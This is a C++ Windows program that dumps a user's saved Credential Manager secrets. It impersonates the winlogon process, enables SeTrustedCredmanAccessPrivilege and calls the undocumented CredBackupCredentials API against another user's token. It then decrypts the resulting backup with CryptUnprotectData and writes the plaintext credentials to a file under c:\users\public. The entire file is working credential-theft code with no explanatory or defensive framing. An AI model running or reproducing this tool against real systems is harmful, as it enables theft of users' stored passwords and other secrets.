#include <stdio.h>
#include <Windows.h>
#include <dpapi.h>
#include <iostream>     // std::cout
#include <fstream>      // std::ifstream
#include <vector>

#pragma comment(lib, "Crypt32.lib")

typedef BOOL (WINAPI* CredBackupCredentials)(HANDLE Token,
	LPCWSTR Path,
	PVOID Password,
	DWORD PasswordSize,
	DWORD Flags);


int main(int argc, char** argv)
{
	int winlogonpid = 1452;
	int userpid = 3276;

	//if (argc != 3) {
	//	printf("Usage: bin.exe winlogonpid userpid");
	//	return 0;
	//}
	//else {
	//	winlogonpid = atoi(argv[1]);
	//	userpid = atoi(argv[2]);
	//}

	CredBackupCredentials pCredBackupCredentials = NULL;
	HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
	if (hAdvapi != NULL) {
		pCredBackupCredentials = (CredBackupCredentials)GetProcAddress(hAdvapi, "CredBackupCredentials");
		if (pCredBackupCredentials == NULL) {
			printf("not here\n");
			return 0;
		}
	}
	else {
		printf("advapi32.dll not loaded...TODO\n");
		return 0;
	}

	printf("opening winlog in process\n");
	HANDLE winlogin = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, winlogonpid);
	if (winlogin == NULL) {
		printf("Open winlogin process handle failed, %d\n", GetLastError());
		return 0;
	}

	printf("opening winlogin token\n");
	HANDLE winloginToken = NULL;
	BOOL ret = OpenProcessToken(winlogin, TOKEN_DUPLICATE, &winloginToken);
	if (ret == FALSE || winloginToken == NULL) {
		printf("Open winlogin process token handle failed, %d\n", GetLastError());
		return 0;
	}

	printf("duplicating winlogin token\n");
	HANDLE dupToken = NULL;
	ret = DuplicateTokenEx(winloginToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken);
	if (ret == FALSE || dupToken == NULL) {
		printf("duplicate winlogin process token failed, %d\n", GetLastError());
		return 0;
	}

	TOKEN_PRIVILEGES tp = { 0 };
	LUID luid = { 0 };

	ret = LookupPrivilegeValueA(NULL, "SeTrustedCredmanAccessPrivilege", &luid);
	if (ret == FALSE) {
		printf("[-] Couldn't lookup the privilege value. Error: 0x%x\n", GetLastError());
		return 0;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	printf("Enabling SeTrustedCredmanAccessPrivilege to duplicate token\n");
	ret = AdjustTokenPrivileges(dupToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, NULL);
	if (ret == FALSE) {
		printf("AdjustTokenPrivileges failed %d\n", GetLastError());
		return 0;
	}

	printf("Getting user process\n");
	HANDLE userProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, userpid);
	if (userProc == NULL) {
		printf("couldnt get user process handle %d\n", GetLastError());
		return 0;
	}

	printf("Getting user token\n");
	HANDLE userToken = NULL;
	ret = OpenProcessToken(userProc, TOKEN_ALL_ACCESS, &userToken);
	if (ret == FALSE || userToken == NULL) {
		printf("opening current user token failed, %d\n", GetLastError());
		return 0;
	}

	printf("impersonating winlogin\n");
	ret = ImpersonateLoggedOnUser(dupToken);
	if (ret == FALSE) {
		printf("ImpersonateLoggedOnUser failed, %d\n", GetLastError());
		return 0;
	}

	printf("creating cred backup for user\n");
	ret = pCredBackupCredentials(userToken, (LPCWSTR)L"c:\\users\\public\\temp.bin", NULL, 0, NULL);
	if (ret == FALSE) {
		printf("CredBackupCredentials failed, %d\n", GetLastError());
		return 0;
	}

	std::ifstream file("c:\\users\\public\\temp.bin", std::ios::binary | std::ios::ate);
	std::streamsize size = file.tellg();
	file.seekg(0, std::ios::beg);

	DATA_BLOB DataOut = { 0 };
	DataOut.cbData = size;
	DataOut.pbData = (BYTE*)malloc(DataOut.cbData);
	file.read((char*)DataOut.pbData, DataOut.cbData);

	DATA_BLOB DataVerify = { 0 };
	LPWSTR pDescrOut = NULL;

	printf("decrypting data\n");
	ret = CryptUnprotectData(&DataOut, &pDescrOut, NULL, NULL, NULL, 0, &DataVerify);
	if (ret == FALSE) {
		printf("CredBackupCredentials failed, %d\n", GetLastError());
		return 0;
	}

	printf("reverting back to self\n");
	ret = RevertToSelf();
	if (ret == FALSE) {
		printf("RevertToSelf failed, %d\n", GetLastError());
		return 0;
	}

	std::ofstream myfile;
	myfile.open("c:\\users\\public\\example.bin");
	myfile.write((const char*)DataVerify.pbData, DataVerify.cbData);
	myfile.close();

	if (DataOut.pbData)
		free(DataOut.pbData);

	if (winlogin)
		CloseHandle(winlogin);

	if (winloginToken)
		CloseHandle(winloginToken);

	if (dupToken)
		CloseHandle(dupToken);

	if (userToken)
		CloseHandle(userToken);

	return 0;
}